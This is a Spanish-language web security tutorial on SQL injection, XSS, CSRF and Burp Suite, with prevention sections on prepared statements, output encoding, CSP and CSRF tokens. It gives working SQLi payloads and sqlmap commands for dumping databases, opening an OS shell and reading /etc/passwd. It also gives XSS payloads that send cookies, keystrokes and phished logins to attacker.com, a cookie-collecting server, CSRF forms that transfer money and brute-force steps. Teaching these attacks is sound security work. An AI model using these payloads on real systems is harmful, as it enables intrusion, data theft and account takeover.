# SQL Injection (SQLi)

## Fundamentos de SQL Injection

### ¿Qué es SQL Injection?

```
Inyectar código SQL malicioso en queries de la aplicación

Impacto:
• Bypass de autenticación
• Lectura de datos sensibles
• Modificación/eliminación de datos
• Ejecución de comandos OS (en algunos casos)
• Toma completa del servidor
```

---

## Detección de SQL Injection

### Payloads de Prueba

```sql
# Comilla simple
'

# Comentarios SQL
-- 
#
/**/

# Operadores lógicos
' OR '1'='1
' OR 1=1 --
" OR "1"="1

# Delays (Time-based)
' AND SLEEP(5) --
' OR IF(1=1, SLEEP(5), 0) --

# Errores
' AND 1=CONVERT(int, 'test') --
```

---

### Identificar Vulnerabilidad

```
URL: http://ejemplo.com/product.php?id=1

Test 1: ?id=1'
Si error SQL: VULNERABLE

Test 2: ?id=1 AND 1=1  (True)
Test 3: ?id=1 AND 1=2  (False)
Si diferentes respuestas: VULNERABLE (Boolean-based)

Test 4: ?id=1' AND SLEEP(5) --
Si delay de 5 seg: VULNERABLE (Time-based)
```

---

## Tipos de SQL Injection

### 1. In-Band SQLi (Clásico)

#### Error-Based SQLi

```sql
# Provocar error para extraer información

# MySQL
' AND 1=CONVERT(int, (SELECT @@version)) --

# PostgreSQL
' AND CAST((SELECT version()) AS int) --

# Extraer datos mediante errores
' AND 1=CONVERT(int, (SELECT username FROM users LIMIT 1)) --
```

---

#### Union-Based SQLi

```sql
# Determinar número de columnas
' ORDER BY 1 --  (OK)
' ORDER BY 2 --  (OK)
' ORDER BY 3 --  (OK)
' ORDER BY 4 --  (Error)
# Conclusión: 3 columnas

# Encontrar columnas con datos tipo string
' UNION SELECT NULL,NULL,NULL --  (Test tipos)
' UNION SELECT 'a',NULL,NULL --
' UNION SELECT NULL,'a',NULL --
' UNION SELECT NULL,NULL,'a' --

# Extraer datos
' UNION SELECT username,password,email FROM users --

# Versión de MySQL
' UNION SELECT NULL,@@version,NULL --

# Base de datos actual
' UNION SELECT NULL,database(),NULL --

# Listar tablas
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables --

# Listar columnas de tabla
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users' --

# Extraer datos específicos
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users --
```

---

### 2. Blind SQLi

#### Boolean-Based

```sql
# Extraer longitud del nombre de BD
' AND LENGTH(database())=1 --  (False)
' AND LENGTH(database())=2 --  (False)
' AND LENGTH(database())=8 --  (True)

# Extraer primer carácter
' AND SUBSTRING(database(),1,1)='a' --  (False)
' AND SUBSTRING(database(),1,1)='t' --  (True)

# Extraer segundo carácter
' AND SUBSTRING(database(),2,1)='e' --  (True)

# Verificar si existe usuario admin
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 --
```

---

#### Time-Based

```sql
# MySQL
' AND IF(1=1, SLEEP(5), 0) --

# Si existe usuario admin
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0) --

# Extraer primer carácter de password
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
```

---

### 3. Out-of-Band SQLi

```sql
# MySQL (menos común)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\share')) --

# Oracle
' || UTL_HTTP.REQUEST('http://attacker.com/'||version) --

# SQL Server
'; EXEC xp_dirtree '\\attacker.com\share' --
```

---

## SQLMap - Herramienta Automatizada

### Instalación

```bash
# Ya viene en Kali
sqlmap --version

# O instalar
sudo apt install sqlmap
```

---

### Uso Básico

```bash
# Test básico
sqlmap -u "http://ejemplo.com/product.php?id=1"

# Con cookie de sesión
sqlmap -u "http://ejemplo.com/product.php?id=1" --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "http://ejemplo.com/login.php" --data="username=admin&password=pass"

# Especificar parámetro vulnerable
sqlmap -u "http://ejemplo.com/product.php?id=1&cat=2" -p id

# Enumerar bases de datos
sqlmap -u "http://ejemplo.com/product.php?id=1" --dbs

# Enumerar tablas de una BD
sqlmap -u "http://ejemplo.com/product.php?id=1" -D nombre_bd --tables

# Enumerar columnas de una tabla
sqlmap -u "http://ejemplo.com/product.php?id=1" -D nombre_bd -T users --columns

# Dumpear datos
sqlmap -u "http://ejemplo.com/product.php?id=1" -D nombre_bd -T users --dump

# Dump todo
sqlmap -u "http://ejemplo.com/product.php?id=1" -D nombre_bd --dump-all

# OS Shell (si permisos)
sqlmap -u "http://ejemplo.com/product.php?id=1" --os-shell

# Leer archivo
sqlmap -u "http://ejemplo.com/product.php?id=1" --file-read="/etc/passwd"
```

---

### Opciones Avanzadas

```bash
# Level y risk (1-5)
sqlmap -u "URL" --level=3 --risk=2

# Técnicas específicas
# B: Boolean-based blind
# E: Error-based
# U: UNION query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries
sqlmap -u "URL" --technique=BEUST

# Randomizar User-Agent
sqlmap -u "URL" --random-agent

# Usar proxy (Burp Suite)
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Tamper scripts (bypass WAF)
sqlmap -u "URL" --tamper=space2comment

# Batch mode (no preguntas)
sqlmap -u "URL" --batch

# Verbose
sqlmap -u "URL" -v 3
```

---

## Prevención de SQL Injection

```php
// MAL - Vulnerable
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";

// BIEN - Prepared Statements (MySQLi)
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();

// BIEN - PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);

// BIEN - ORM (Eloquent, Doctrine, SQLAlchemy)
User::find($id);
```

---

# Cross-Site Scripting (XSS)

## ¿Qué es XSS?

```
Inyectar JavaScript malicioso que se ejecuta en el navegador de la víctima

Impacto:
• Robo de cookies (session hijacking)
• Keylogging
• Phishing
• Defacement
• Redirección maliciosa
• Robo de credenciales
```

---

## Tipos de XSS

### 1. Reflected XSS (No Persistente)

```
El payload se refleja inmediatamente en la respuesta

Flujo:
1. Atacante crea URL maliciosa
2. Víctima hace clic en el link
3. Servidor refleja el script en la respuesta
4. Script se ejecuta en navegador de víctima
```

**Ejemplo:**

```
URL vulnerable:
http://ejemplo.com/search?q=<script>alert('XSS')</script>

Código vulnerable:
<?php
echo "Resultados para: " . $_GET['q'];
?>

Resultado HTML:
Resultados para: <script>alert('XSS')</script>
```

---

### 2. Stored XSS (Persistente)

```
El payload se guarda en la BD y se ejecuta para todos

Flujo:
1. Atacante envía payload (ej: comentario)
2. Aplicación guarda payload en BD
3. Otros usuarios ven el contenido
4. Script se ejecuta en navegador de cada usuario
```

**Ejemplo:**

```php
// Guardar comentario (sin sanitización)
$comment = $_POST['comment'];
$query = "INSERT INTO comments (text) VALUES ('$comment')";

// Mostrar comentarios
<?php
foreach ($comments as $comment) {
    echo $comment['text'];  // XSS!
}
?>

// Payload del atacante
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

---

### 3. DOM-Based XSS

```
Vulnerabilidad en código JavaScript del lado del cliente

No involucra al servidor
```

**Ejemplo:**

```javascript
// Código vulnerable
var search = window.location.hash.substring(1);
document.getElementById('result').innerHTML = search;

// URL maliciosa
http://ejemplo.com/#<img src=x onerror=alert('XSS')>
```

---

## Payloads de XSS

### Básicos

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

---

### Bypass de Filtros

```html
# Sin espacios
<script>alert('XSS')</script>
<script>alert`XSS`</script>

# Case mixing
<ScRiPt>alert('XSS')</ScRiPt>

# Encoding
<script>alert('XSS')</script>  (URL encoded)
<script>alert('XSS')</script>  (HTML entities)

# Usando eventos
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

# Sin comillas
<script>alert(String.fromCharCode(88,83,83))</script>

# Bypass de palabras clave
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

---

### Robo de Cookies

```javascript
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

// O con imagen
<script>
new Image().src='http://attacker.com/steal?cookie=' + document.cookie;
</script>

// Servidor del atacante (Python)
from flask import Flask, request
app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie')
    with open('cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return 'OK'

app.run(host='0.0.0.0', port=80)
```

---

### Keylogger XSS

```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + String.fromCharCode(e.which));
}
</script>
```

---

### Phishing XSS

```javascript
<script>
document.body.innerHTML = '<h1>Sesión expirada</h1>' +
'<form action="http://attacker.com/phish" method="POST">' +
'Usuario: <input name="username"><br>' +
'Password: <input type="password" name="password"><br>' +
'<input type="submit" value="Login">' +
'</form>';
</script>
```

---

## Prevención de XSS

### Output Encoding

```php
// MAL
echo $_GET['name'];

// BIEN - HTML encoding
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

// JavaScript context
echo json_encode($_GET['name']);

// URL context
echo urlencode($_GET['name']);
```

---

### Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

Efectos:
• Solo scripts del mismo origen
• Bloquea inline scripts
• Bloquea eval()
• Whitelist de dominios permitidos
```

---

### HttpOnly Cookies

```php
// Previene robo de cookies via XSS
setcookie('session', $value, [
    'httponly' => true,  // No accesible desde JavaScript
    'secure' => true,    // Solo HTTPS
    'samesite' => 'Strict'
]);
```

---

# CSRF (Cross-Site Request Forgery)

## ¿Qué es CSRF?

```
Forzar a un usuario autenticado a realizar acciones no deseadas

Flujo:
1. Víctima está logueada en ejemplo.com
2. Atacante envía link/página maliciosa
3. Página hace request a ejemplo.com
4. Browser envía cookies automáticamente
5. Acción se ejecuta como la víctima
```

---

## Ejemplo de CSRF

```html
<!-- Víctima logueada en banco.com -->
<!-- Atacante envía este HTML -->

<!-- Transferir dinero -->
<img src="http://banco.com/transfer?to=atacante&amount=10000">

<!-- O con form automático -->
<form action="http://banco.com/transfer" method="POST" id="csrf">
    <input name="to" value="atacante">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Cambiar email -->
<img src="http://sitio.com/change_email?email=atacante@evil.com">
```

---

## Prevención de CSRF

### CSRF Tokens

```php
// Generar token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Form
<form method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input name="email">
    <button>Guardar</button>
</form>

// Validar
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token inválido');
}
```

---

### SameSite Cookies

```php
setcookie('session', $value, [
    'samesite' => 'Strict'  // No enviar en requests cross-site
]);

// Valores:
// Strict - Nunca enviar cross-site
// Lax - Enviar en GET de navegación
// None - Siempre enviar (requiere Secure)
```

---

# Burp Suite

## ¿Qué es Burp Suite?

```
Suite de herramientas para pentesting web

Componentes:
• Proxy (interceptar requests)
• Repeater (modificar y reenviar)
• Intruder (fuzzing)
• Scanner (automático - solo Pro)
• Decoder (encode/decode)
• Comparer (comparar responses)
• Sequencer (analizar tokens)
```

---

## Configuración Inicial

```
1. Instalar Burp Suite Community
   https://portswigger.net/burp/communitydownload

2. Ejecutar: java -jar burpsuite.jar

3. Configurar proxy en navegador:
   127.0.0.1:8080

4. Instalar certificado CA de Burp
   http://burpsuite
   Download CA certificate
```

---

## Uso de Burp Proxy

```
1. Abrir Burp Suite
2. Tab "Proxy" → "Intercept" → "Intercept is on"
3. Navegar en browser
4. Request aparece en Burp
5. Modificar request
6. "Forward" para enviar
7. Ver response en "HTTP history"
```

---

## Repeater

```
Modificar y reenviar requests múltiples veces

Uso:
1. Hacer clic derecho en request (Proxy/History)
2. "Send to Repeater"
3. Tab "Repeater"
4. Modificar request
5. "Send"
6. Ver response
7. Modificar y repetir
```

---

## Intruder (Fuzzing)

```
Automatizar ataques con payloads

Tipos de ataque:
• Sniper - Un parámetro a la vez
• Battering ram - Mismo payload en todos
• Pitchfork - Payloads paralelos
• Cluster bomb - Todas combinaciones
```

**Ejemplo: Brute Force**

```
1. Capture login request
2. Send to Intruder
3. Mark password field: §password§
4. Tab "Payloads"
5. Load wordlist
6. Start attack
7. Analizar responses (código 302 = éxito)
```